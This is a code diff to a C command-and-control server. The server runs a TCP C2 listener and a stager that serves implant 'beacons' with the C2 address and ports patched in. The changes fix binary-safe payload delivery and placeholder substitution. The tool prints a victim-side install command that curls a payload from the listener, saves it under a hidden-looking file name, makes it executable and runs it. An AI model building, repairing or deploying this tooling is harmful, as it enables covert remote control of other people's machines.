@@ -135,6 +135,7 @@ char stage_req[1024];
 // Set up TCP listener on port 443 bound to any interface
 int c2_sock;
 struct sockaddr_in c2_addr, c2_req_addr;
+socklen_t c2_addr_len = sizeof(c2_req_addr);
 socklen_t c2_req_addr_len = sizeof(c2_req_addr);
 char c2_req[1024];
 
@@ -227,7 +228,7 @@ char* select_ip() {
     int selection;
     scanf("%d", &selection);
     clear_input();
-    if (selection < 0 || selection >= index) {
+    if (selection < 0 || selection > index) {
         printf("Invalid selection\n");
         select_ip();
     }
@@ -274,7 +275,7 @@ char* select_type() {
     int selection;
     scanf("%d", &selection);
     clear_input();
-    if (selection < 0 || selection >= index) {
+    if (selection < 0 || selection > index) {
         printf("Invalid selection\n");
         select_type();
     }
@@ -303,6 +304,7 @@ int set(char* option, char* value) {
     printf("Invalid option\n");
     return -1;
 }
+
 
 int banner() {
     // Clear the screen
@@ -356,6 +358,40 @@ int status() {
     return 0;
 }
 
+char* normalize_ip(char orig[]) {
+    char* ret = malloc(10);
+
+    /*char* temp_ip = malloc(16);
+    strcpy(temp_ip, orig);
+
+    // use strtok to split listen_ip into 4 parts
+    char* part = strtok(temp_ip, ".");
+    int segment = atoi(part);
+    sprintf(ret, "%03d", segment);
+    part = strtok(NULL, ".");
+    segment = atoi(part);
+    sprintf(ret, "%s.%03d", ret, segment);
+    part = strtok(NULL, ".");
+    segment = atoi(part);
+    sprintf(ret, "%s.%03d", ret, segment);
+    part = strtok(NULL, ".");
+    segment = atoi(part);
+    sprintf(ret, "%s.%03d", ret, segment);*/
+
+    sprintf(ret, "%10d", inet_addr(orig));
+
+    return ret;
+}
+char* normalize_port(int port) {
+    char* ret = malloc(11);
+    sprintf(ret, "%010d", port);
+    return ret;
+}
+char* normalize_id(int id) {
+    char* ret = malloc(6);
+    sprintf(ret, "%05d", id);
+    return ret;
+}
 
 int stager_req_id(char* req) {
     if (strlen(req) < 5 || strncmp(req, "GET /", 5) != 0) {
@@ -373,7 +409,7 @@ char* stager_req_ip(char* req) {
     r = strtok(r, "\n");
     return r;
 }
-char* load_beacon(char* type, int id) {
+char* load_beacon(char* type, int id, long* size) {
     char* path = malloc(256 + 8);
     strcpy(path, "./src/beacons/");
     strcat(path, type);
@@ -383,73 +419,67 @@ char* load_beacon(char* type, int id) {
         return NULL;
     }
     fseek(f, 0, SEEK_END);
-    long fsize = ftell(f);
+    *size = ftell(f);
     fseek(f, 0, SEEK_SET);
-    char* beacon = malloc(fsize + 1);
-    fread(beacon, fsize, 1, f);
+    char* beacon = malloc(*size + 1);
+    fread(beacon, *size, 1, f);
     fclose(f);
     free(path);
-    beacon[fsize] = 0;
 
     // Replace any occurances of ${C2_IP} with host and ${C2_PORT} with lp_port
-    int int_placeholder = 12345;
-    char* str_c2_port = malloc(6);
-    sprintf(str_c2_port, "%d", c2_port);
-    char* str_lp_port = malloc(6);
-    sprintf(str_lp_port, "%d", lp_port);
-    for (int i = 0; i < fsize - 15; i++) {
-        if (strncmp(beacon + i, "${C2_IP_XXXXXX}", 15) == 0 || strncmp(beacon + i, "XXX.XXX.XXX.XXX", 15) == 0) {
-            memcpy(beacon + i, listen_ip, strlen(listen_ip));
-            memcpy(beacon + i + strlen(listen_ip), beacon + i + 15, fsize - i - 15);
-            beacon[fsize - 15 + strlen(listen_ip)] = 0;
+    
+    char* str_c2_ip = normalize_ip(listen_ip);
+    char* str_c2_port = normalize_port(c2_port);
+    char* str_lp_port = normalize_port(lp_port);
+    char* str_id = normalize_id(id);
+
+    for (int i = 0; i < *size - 15; i++) {
+        if (strncmp(beacon + i, "${C2_IPID}", 10) == 0) {
+            memcpy(beacon + i, str_c2_ip, 10);
         }
     }
-    for (int i = 0; i < fsize - 10; i++) {
+    for (int i = 0; i < *size - 10; i++) {
         if (strncmp(beacon + i, "${C2_PORT}", 10) == 0) {
-            memcpy(beacon + i, str_c2_port, strlen(str_c2_port));
-            memcpy(beacon + i + strlen(str_c2_port), beacon + i + 10, fsize - i - 10);
-            beacon[fsize - 10 + strlen(str_c2_port)] = 0;
+            memcpy(beacon + i, str_c2_port, 10);
         }
     }
-    for (int i = 0; i < fsize - 10; i++) {
+    for (int i = 0; i < *size - 10; i++) {
         if (strncmp(beacon + i, "${LP_PORT}", 10) == 0) {
-            memcpy(beacon + i, str_lp_port, strlen(str_lp_port));
-            memcpy(beacon + i + strlen(str_lp_port), beacon + i + 10, fsize - i - 10);
-            beacon[fsize - 10 + strlen(str_lp_port)] = 0;
+            memcpy(beacon + i, str_lp_port, 10);
         }
     }
-    for (int i = 0; i < fsize - 4; i++) {
-        if (memcmp(beacon + i, &int_placeholder, 4) == 0) {
-            memcpy(beacon + i, &lp_port, 4);
+    for (int i = 0; i < *size - 5; i++) {
+        if (strncmp(beacon + i, "${ID}", 5) == 0) {
+            memcpy(beacon + i, str_id, 5);
         }
     }
-    int_placeholder = 54321;
-    for (int i = 0; i < fsize - 4; i++) {
-        if (memcmp(beacon + i, &int_placeholder, 4) == 0) {
-            memcpy(beacon + i, &id, 4);
-        }
-    }
+
+    // Write beacon to test/beacon for debugging
+    FILE* f2 = fopen("./test/beacon", "wb");
+    fwrite(beacon, *size, 1, f2);
+    fclose(f2);
+
     return beacon;
 }
 
-char* gen_stager_resp(int id, char* host) {
+char* gen_stager_resp(int id, char* host, long* size) {
     if (id < 0 || id > beacon_count) {
         char* resp = malloc(256);
         strcpy(resp, "HTTP/1.1 404 Not Found\r\n\r\n");
         error("Invalid beacon ID\n");
         return resp;
     }
-    char* beacon = load_beacon(beacons[id].type, id);
+    char* beacon = load_beacon(beacons[id].type, id, size);
     if (beacon == NULL) {
         char* resp = malloc(256);
         strcpy(resp, "HTTP/1.1 404 Not Found\r\n\r\n");
         error("Beacon could not be loaded\n");
         return resp;
     }
-    char* resp = malloc(strlen(beacon) + 24);
+    char* resp = malloc(*size + 24);
     strcpy(resp, "HTTP/1.1 200 OK\r\n\r\n");
-    strcat(resp, beacon);
-    resp[strlen(beacon) + 24] = 0;
+    memcpy(resp + 19, beacon, *size);
+    resp[*size + 23] = 0;
     free(beacon);
     fflush(stdout);
     return resp;
@@ -517,11 +547,12 @@ void *stager_loop(void *vargp) {
         }
         char* host = stager_req_ip(stage_req);
         // Respond with an implant matching the requested ID with the correct host
-        char* resp = gen_stager_resp(id, host);
+        long stager_size = 0;
+        char* resp = gen_stager_resp(id, host, &stager_size);
 
         // Send response:
         stage_req_addr_len = sizeof(stage_req_addr);
-        if(sendto(conn, resp, strlen(resp), 0, (struct sockaddr*)&stage_req_addr, stage_req_addr_len) < 0){
+        if(sendto(conn, resp, stager_size, 0, (struct sockaddr*)&stage_req_addr, stage_req_addr_len) < 0){
             perror("Problem while sending message");
             continue;
         }
@@ -663,13 +694,13 @@ void *c2_loop(void *vargp) {
             continue;
         }
         // Accept incoming connection:
-        int conn = accept(c2_sock, (struct sockaddr*)&c2_req_addr, &c2_req_addr_len);
+        int conn = accept(c2_sock, (struct sockaddr*)&c2_req_addr, &c2_addr_len);
         if(conn < 0){
             perror("Problem while accepting connection");
             continue;
         }
         // Receive header packet
-        int recv_len = recvfrom(conn, &id, 4, 0, (struct sockaddr*)&c2_req_addr, &c2_req_addr_len);
+        int recv_len = recvfrom(conn, &id, 4, 0, (struct sockaddr*)&c2_req_addr, &c2_addr_len);
         if(recv_len < 0){
             perror("Problem while receiving message");
             continue;
@@ -704,7 +735,7 @@ void *c2_loop(void *vargp) {
         char which[1024];
 
         /* Open the command for reading. */
-        sprintf(which, "/bin/which %s", file);
+        sprintf(which, "which %s", file);
         pp = popen(which, "r");
         if (pp == NULL) {
             printf("Failed to find command %s\n", file);
@@ -821,7 +852,7 @@ int generate_beacon() {
 
     printf(BLU "  [INFO]: Beacon generated for %s with ID %d\n" CRESET, beacons[beacon_count].type, beacons[beacon_count].id);
     printf(BLU "          Copy the following command into the remote system to install the beacon:\n\n" CRESET);
-    printf(BBLU "          curl %s:%d/%d > ., && chmod +x ., && ./.,\n\n" CRESET, listen_ip, stager_port, beacons[beacon_count].id);
+    printf(BBLU "          curl %s:%d/%d -o ., && chmod +x ., && ./.,\n\n" CRESET, listen_ip, stager_port, beacons[beacon_count].id);
     beacon_count++;
 
     return 0;
